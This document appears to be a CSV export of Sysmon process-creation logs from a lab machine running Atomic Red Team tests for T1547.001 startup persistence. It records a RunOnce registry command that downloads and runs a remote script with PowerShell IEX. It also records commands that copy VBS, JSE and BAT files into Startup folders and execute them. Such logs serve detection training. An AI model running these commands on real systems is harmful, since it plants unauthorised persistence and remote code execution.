"2025-12-26 11:18:49.420 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",173562,"Cmdline: REG ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /d ""C:\Path\AtomicRedTeam.dll"" ¦ Proc: C:\Windows\System32\reg.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""cmd.exe"" /c REG ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /d ""C:\Path\AtomicRedTeam.dll"" ¦ LID: 0x1894a ¦ LGUID: E9F06A57-5FE2-694E-4A89-010000000000 ¦ PID: 1804 ¦ PGUID: E9F06A57-6109-694E-6E01-000000002400 ¦ ParentPID: 840 ¦ ParentPGUID: E9F06A57-6109-694E-6C01-000000002400 ¦ Description: Registry Console Tool ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=47FC2471604EB7D760938BF31456B12D,SHA256=321590E79C53AA24B197F08A21A0329E5AB9F212B2BD748AF09A7BE6F838F585,IMPHASH=3B322244D4C64F3C932F94E6E3457771","CurrentDirectory: C:\Users\student\AppData\Local\Temp\ ¦ FileVersion: 10.0.26100.1882 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: reg.exe ¦ ParentImage: C:\Windows\System32\cmd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-26 10:18:49.413","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:18:49.928 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",173564,"Cmdline: ""powershell.exe"" & {$RunOnceKey = \""""HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce\"""" set-itemproperty $RunOnceKey \""""NextRun\"""" 'powershell.exe \""""IEX (New-Object Net.WebClient).DownloadString(`\""""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1547.001/src/Discovery.bat`\"""")\""""'} ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass ¦ LID: 0x1894a ¦ LGUID: E9F06A57-5FE2-694E-4A89-010000000000 ¦ PID: 6384 ¦ PGUID: E9F06A57-6109-694E-6F01-000000002400 ¦ ParentPID: 9132 ¦ ParentPGUID: E9F06A57-602B-694E-E700-000000002400 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CommandLine: ""powershell.exe"" & {$RunOnceKey = \""""HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce\"""" set-itemproperty $RunOnceKey \""""NextRun\"""" 'powershell.exe \""""IEX (New-Object Net.WebClient).DownloadString(`\""""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1547.001/src/Discovery.bat`\"""")\""""'} ¦ CurrentDirectory: C:\Users\student\AppData\Local\Temp\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-26 10:18:49.675","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:18:51.455 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",173566,"Cmdline: ""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"" --type=utility --utility-sub-type=unzip.mojom.Unzipper --lang=en-GB --service-sandbox-type=service --video-capture-use-gpu-memory-buffer --no-pre-read-main-dll --ram-no-pressure-read-main-dll --metrics-shmem-handle=5352,i,4439622833718363516,17659500233614532511,524288 --field-trial-handle=1988,i,13279507995747332574,9132512059420465572,262144 --variations-seed-version --trace-process-track-uuid=3190708996619331833 --mojo-platform-channel-handle=4728 /prefetch:14 ¦ Proc: C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"" --no-startup-window --win-session-start ¦ LID: 0x18a9d ¦ LGUID: E9F06A57-5FE2-694E-9D8A-010000000000 ¦ PID: 3732 ¦ PGUID: E9F06A57-610B-694E-7101-000000002400 ¦ ParentPID: 772 ¦ ParentPGUID: E9F06A57-607E-694E-4201-000000002400 ¦ Description: Microsoft Edge ¦ Product: Microsoft Edge ¦ Company: Microsoft Corporation ¦ Hashes: MD5=EEDCB91823A577336215FD725124B011,SHA256=9AFD1452D57620CC28C97C1760BB3FD195FB69D76037818EC956DE75B85771F1,IMPHASH=9ACEBDFAC77931C2B0DFBBEA2D494BA9","CurrentDirectory: C:\Program Files (x86)\Microsoft\Edge\Application\143.0.3650.96\ ¦ FileVersion: 143.0.3650.96 ¦ IntegrityLevel: Low ¦ OriginalFileName: msedge.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-26 10:18:51.447","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:18:53.961 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",173568,"Cmdline: ""powershell.exe"" & {Copy-Item \""""C:\AtomicRedTeam\atomics\T1547.001\src\vbsstartup.vbs\"""" \""""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs\"""" Copy-Item \""""C:\AtomicRedTeam\atomics\T1547.001\src\vbsstartup.vbs\"""" \""""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\vbsstartup.vbs\"""" cscript.exe \""""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs\"""" cscript.exe \""""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\vbsstartup.vbs\""""} ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass ¦ LID: 0x1894a ¦ LGUID: E9F06A57-5FE2-694E-4A89-010000000000 ¦ PID: 7868 ¦ PGUID: E9F06A57-610D-694E-7201-000000002400 ¦ ParentPID: 9132 ¦ ParentPGUID: E9F06A57-602B-694E-E700-000000002400 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CommandLine: ""powershell.exe"" & {Copy-Item \""""C:\AtomicRedTeam\atomics\T1547.001\src\vbsstartup.vbs\"""" \""""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs\"""" Copy-Item \""""C:\AtomicRedTeam\atomics\T1547.001\src\vbsstartup.vbs\"""" \""""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\vbsstartup.vbs\"""" cscript.exe \""""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs\"""" cscript.exe \""""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\vbsstartup.vbs\""""} ¦ CurrentDirectory: C:\Users\student\AppData\Local\Temp\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-26 10:18:53.942","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:18:54.579 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",173578,"Cmdline: ""C:\WINDOWS\system32\cscript.exe"" ""C:\Users\student\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs"" ¦ Proc: C:\Windows\System32\cscript.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""powershell.exe"" & {Copy-Item \""""C:\AtomicRedTeam\atomics\T1547.001\src\vbsstartup.vbs\"""" \""""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs\"""" Copy-Item \""""C:\AtomicRedTeam\atomics\T1547.001\src\vbsstartup.vbs\"""" \""""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\vbsstartup.vbs\"""" cscript.exe \""""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs\"""" cscript.exe \""""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\vbsstartup.vbs\""""} ¦ LID: 0x1894a ¦ LGUID: E9F06A57-5FE2-694E-4A89-010000000000 ¦ PID: 8392 ¦ PGUID: E9F06A57-610E-694E-7401-000000002400 ¦ ParentPID: 7868 ¦ ParentPGUID: E9F06A57-610D-694E-7201-000000002400 ¦ Description: Microsoft ® Console Based Script Host ¦ Product: Microsoft ® Windows Script Host ¦ Company: Microsoft Corporation ¦ Hashes: MD5=D12B8C23A5360CED9A30EF7532042E6D,SHA256=5084B9867A14F60AA1A46C486C9FEB8ED8C843DC754BD661118C9CE2FC77CDF9,IMPHASH=D2447EDBFB0905AA7192706112935907","CurrentDirectory: C:\Users\student\AppData\Local\Temp\ ¦ FileVersion: 5.812.10240.16384 ¦ IntegrityLevel: High ¦ OriginalFileName: cscript.exe ¦ ParentCommandLine: ""powershell.exe"" & {Copy-Item \""""C:\AtomicRedTeam\atomics\T1547.001\src\vbsstartup.vbs\"""" \""""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs\"""" Copy-Item \""""C:\AtomicRedTeam\atomics\T1547.001\src\vbsstartup.vbs\"""" \""""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\vbsstartup.vbs\"""" cscript.exe \""""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs\"""" cscript.exe \""""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\vbsstartup.vbs\""""} ¦ ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-26 10:18:54.571","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:18:54.858 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",173579,"Cmdline: ""C:\WINDOWS\system32\cscript.exe"" ""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\vbsstartup.vbs"" ¦ Proc: C:\Windows\System32\cscript.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""powershell.exe"" & {Copy-Item \""""C:\AtomicRedTeam\atomics\T1547.001\src\vbsstartup.vbs\"""" \""""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs\"""" Copy-Item \""""C:\AtomicRedTeam\atomics\T1547.001\src\vbsstartup.vbs\"""" \""""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\vbsstartup.vbs\"""" cscript.exe \""""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs\"""" cscript.exe \""""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\vbsstartup.vbs\""""} ¦ LID: 0x1894a ¦ LGUID: E9F06A57-5FE2-694E-4A89-010000000000 ¦ PID: 1244 ¦ PGUID: E9F06A57-610E-694E-7501-000000002400 ¦ ParentPID: 7868 ¦ ParentPGUID: E9F06A57-610D-694E-7201-000000002400 ¦ Description: Microsoft ® Console Based Script Host ¦ Product: Microsoft ® Windows Script Host ¦ Company: Microsoft Corporation ¦ Hashes: MD5=D12B8C23A5360CED9A30EF7532042E6D,SHA256=5084B9867A14F60AA1A46C486C9FEB8ED8C843DC754BD661118C9CE2FC77CDF9,IMPHASH=D2447EDBFB0905AA7192706112935907","CurrentDirectory: C:\Users\student\AppData\Local\Temp\ ¦ FileVersion: 5.812.10240.16384 ¦ IntegrityLevel: High ¦ OriginalFileName: cscript.exe ¦ ParentCommandLine: ""powershell.exe"" & {Copy-Item \""""C:\AtomicRedTeam\atomics\T1547.001\src\vbsstartup.vbs\"""" \""""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs\"""" Copy-Item \""""C:\AtomicRedTeam\atomics\T1547.001\src\vbsstartup.vbs\"""" \""""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\vbsstartup.vbs\"""" cscript.exe \""""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs\"""" cscript.exe \""""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\vbsstartup.vbs\""""} ¦ ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-26 10:18:54.844","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:18:55.225 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",173580,"Cmdline: ""powershell.exe"" & {Copy-Item \""""C:\AtomicRedTeam\atomics\T1547.001\src\jsestartup.jse\"""" \""""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\jsestartup.jse\"""" Copy-Item \""""C:\AtomicRedTeam\atomics\T1547.001\src\jsestartup.jse\"""" \""""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\jsestartup.jse\"""" cscript.exe /E:Jscript \""""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\jsestartup.jse\"""" cscript.exe /E:Jscript \""""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\jsestartup.jse\""""} ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass ¦ LID: 0x1894a ¦ LGUID: E9F06A57-5FE2-694E-4A89-010000000000 ¦ PID: 5496 ¦ PGUID: E9F06A57-610F-694E-7601-000000002400 ¦ ParentPID: 9132 ¦ ParentPGUID: E9F06A57-602B-694E-E700-000000002400 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CommandLine: ""powershell.exe"" & {Copy-Item \""""C:\AtomicRedTeam\atomics\T1547.001\src\jsestartup.jse\"""" \""""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\jsestartup.jse\"""" Copy-Item \""""C:\AtomicRedTeam\atomics\T1547.001\src\jsestartup.jse\"""" \""""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\jsestartup.jse\"""" cscript.exe /E:Jscript \""""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\jsestartup.jse\"""" cscript.exe /E:Jscript \""""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\jsestartup.jse\""""} ¦ CurrentDirectory: C:\Users\student\AppData\Local\Temp\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-26 10:18:55.196","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:18:55.829 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",173590,"Cmdline: ""C:\WINDOWS\system32\cscript.exe"" /E:Jscript ""C:\Users\student\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\jsestartup.jse"" ¦ Proc: C:\Windows\System32\cscript.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""powershell.exe"" & {Copy-Item \""""C:\AtomicRedTeam\atomics\T1547.001\src\jsestartup.jse\"""" \""""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\jsestartup.jse\"""" Copy-Item \""""C:\AtomicRedTeam\atomics\T1547.001\src\jsestartup.jse\"""" \""""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\jsestartup.jse\"""" cscript.exe /E:Jscript \""""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\jsestartup.jse\"""" cscript.exe /E:Jscript \""""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\jsestartup.jse\""""} ¦ LID: 0x1894a ¦ LGUID: E9F06A57-5FE2-694E-4A89-010000000000 ¦ PID: 8664 ¦ PGUID: E9F06A57-610F-694E-7901-000000002400 ¦ ParentPID: 5496 ¦ ParentPGUID: E9F06A57-610F-694E-7601-000000002400 ¦ Description: Microsoft ® Console Based Script Host ¦ Product: Microsoft ® Windows Script Host ¦ Company: Microsoft Corporation ¦ Hashes: MD5=D12B8C23A5360CED9A30EF7532042E6D,SHA256=5084B9867A14F60AA1A46C486C9FEB8ED8C843DC754BD661118C9CE2FC77CDF9,IMPHASH=D2447EDBFB0905AA7192706112935907","CurrentDirectory: C:\Users\student\AppData\Local\Temp\ ¦ FileVersion: 5.812.10240.16384 ¦ IntegrityLevel: High ¦ OriginalFileName: cscript.exe ¦ ParentCommandLine: ""powershell.exe"" & {Copy-Item \""""C:\AtomicRedTeam\atomics\T1547.001\src\jsestartup.jse\"""" \""""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\jsestartup.jse\"""" Copy-Item \""""C:\AtomicRedTeam\atomics\T1547.001\src\jsestartup.jse\"""" \""""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\jsestartup.jse\"""" cscript.exe /E:Jscript \""""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\jsestartup.jse\"""" cscript.exe /E:Jscript \""""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\jsestartup.jse\""""} ¦ ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-26 10:18:55.818","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:18:56.307 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",173591,"Cmdline: ""C:\WINDOWS\system32\SecureBootEncodeUEFI.exe"" ¦ Proc: C:\Windows\System32\SecureBootEncodeUEFI.exe ¦ User: NT AUTHORITY\SYSTEM ¦ ParentCmdline: C:\WINDOWS\System32\svchost.exe -k netsvcs -p ¦ LID: 0x3e7 ¦ LGUID: E9F06A57-5FE0-694E-E703-000000000000 ¦ PID: 8556 ¦ PGUID: E9F06A57-6110-694E-7A01-000000002400 ¦ ParentPID: 1400 ¦ ParentPGUID: E9F06A57-5FE2-694E-1C00-000000002400 ¦ Description: Secure Boot UEFI Encoder ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=EF0108166CCA96ACC2B1B164872BC953,SHA256=8271DDDFDF09FD880CB24D2CE7D0C7ADF805D9592FCFF1E24B77C0655E27F776,IMPHASH=4E022C4DB65C72241325705857CD17B6","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.2454 (WinBuild.160101.0800) ¦ IntegrityLevel: System ¦ OriginalFileName: SecureBootEncodeUEFI.exe ¦ ParentImage: C:\Windows\System32\svchost.exe ¦ RuleName: - ¦ TerminalSessionId: 0 ¦ UtcTime: 2025-12-26 10:18:56.284","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:18:56.766 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",173592,"Cmdline: ""C:\WINDOWS\system32\cscript.exe"" /E:Jscript ""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\jsestartup.jse"" ¦ Proc: C:\Windows\System32\cscript.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""powershell.exe"" & {Copy-Item \""""C:\AtomicRedTeam\atomics\T1547.001\src\jsestartup.jse\"""" \""""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\jsestartup.jse\"""" Copy-Item \""""C:\AtomicRedTeam\atomics\T1547.001\src\jsestartup.jse\"""" \""""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\jsestartup.jse\"""" cscript.exe /E:Jscript \""""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\jsestartup.jse\"""" cscript.exe /E:Jscript \""""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\jsestartup.jse\""""} ¦ LID: 0x1894a ¦ LGUID: E9F06A57-5FE2-694E-4A89-010000000000 ¦ PID: 9072 ¦ PGUID: E9F06A57-6110-694E-7C01-000000002400 ¦ ParentPID: 5496 ¦ ParentPGUID: E9F06A57-610F-694E-7601-000000002400 ¦ Description: Microsoft ® Console Based Script Host ¦ Product: Microsoft ® Windows Script Host ¦ Company: Microsoft Corporation ¦ Hashes: MD5=D12B8C23A5360CED9A30EF7532042E6D,SHA256=5084B9867A14F60AA1A46C486C9FEB8ED8C843DC754BD661118C9CE2FC77CDF9,IMPHASH=D2447EDBFB0905AA7192706112935907","CurrentDirectory: C:\Users\student\AppData\Local\Temp\ ¦ FileVersion: 5.812.10240.16384 ¦ IntegrityLevel: High ¦ OriginalFileName: cscript.exe ¦ ParentCommandLine: ""powershell.exe"" & {Copy-Item \""""C:\AtomicRedTeam\atomics\T1547.001\src\jsestartup.jse\"""" \""""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\jsestartup.jse\"""" Copy-Item \""""C:\AtomicRedTeam\atomics\T1547.001\src\jsestartup.jse\"""" \""""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\jsestartup.jse\"""" cscript.exe /E:Jscript \""""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\jsestartup.jse\"""" cscript.exe /E:Jscript \""""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\jsestartup.jse\""""} ¦ ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-26 10:18:56.747","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:18:57.140 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",173593,"Cmdline: ""powershell.exe"" & {Copy-Item \""""C:\AtomicRedTeam\atomics\T1547.001\src\batstartup.bat\"""" \""""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\batstartup.bat\"""" Copy-Item \""""C:\AtomicRedTeam\atomics\T1547.001\src\batstartup.bat\"""" \""""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\batstartup.bat\"""" Start-Process \""""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\batstartup.bat\"""" Start-Process \""""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\batstartup.bat\""""} ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass ¦ LID: 0x1894a ¦ LGUID: E9F06A57-5FE2-694E-4A89-010000000000 ¦ PID: 8056 ¦ PGUID: E9F06A57-6111-694E-7D01-000000002400 ¦ ParentPID: 9132 ¦ ParentPGUID: E9F06A57-602B-694E-E700-000000002400 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CommandLine: ""powershell.exe"" & {Copy-Item \""""C:\AtomicRedTeam\atomics\T1547.001\src\batstartup.bat\"""" \""""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\batstartup.bat\"""" Copy-Item \""""C:\AtomicRedTeam\atomics\T1547.001\src\batstartup.bat\"""" \""""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\batstartup.bat\"""" Start-Process \""""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\batstartup.bat\"""" Start-Process \""""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\batstartup.bat\""""} ¦ CurrentDirectory: C:\Users\student\AppData\Local\Temp\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-26 10:18:57.126","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:19:02.945 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",173603,"Cmdline: C:\WINDOWS\system32\cmd.exe /c """"C:\Users\student\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\batstartup.bat"" "" ¦ Proc: C:\Windows\System32\cmd.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""powershell.exe"" & {Copy-Item \""""C:\AtomicRedTeam\atomics\T1547.001\src\batstartup.bat\"""" \""""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\batstartup.bat\"""" Copy-Item \""""C:\AtomicRedTeam\atomics\T1547.001\src\batstartup.bat\"""" \""""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\batstartup.bat\"""" Start-Process \""""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\batstartup.bat\"""" Start-Process \""""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\batstartup.bat\""""} ¦ LID: 0x1894a ¦ LGUID: E9F06A57-5FE2-694E-4A89-010000000000 ¦ PID: 5672 ¦ PGUID: E9F06A57-6116-694E-7F01-000000002400 ¦ ParentPID: 8056 ¦ ParentPGUID: E9F06A57-6111-694E-7D01-000000002400 ¦ Description: Windows Command Processor ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=FE48494F2B5A9C452F12E9BBE93A6BE6,SHA256=746C77047FC973F7CA66F8AF28274A30E05F4BB1751EE8A2C6546D9DA48E1115,IMPHASH=EDEF5A2A98D730D4288FE684BA0B0E00","CurrentDirectory: C:\Users\student\AppData\Local\Temp\ ¦ FileVersion: 10.0.26100.2454 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: Cmd.Exe ¦ ParentCommandLine: ""powershell.exe"" & {Copy-Item \""""C:\AtomicRedTeam\atomics\T1547.001\src\batstartup.bat\"""" \""""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\batstartup.bat\"""" Copy-Item \""""C:\AtomicRedTeam\atomics\T1547.001\src\batstartup.bat\"""" \""""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\batstartup.bat\"""" Start-Process \""""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\batstartup.bat\"""" Start-Process \""""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\batstartup.bat\""""} ¦ ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-26 10:19:02.927","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\art_1547_001.evtx"
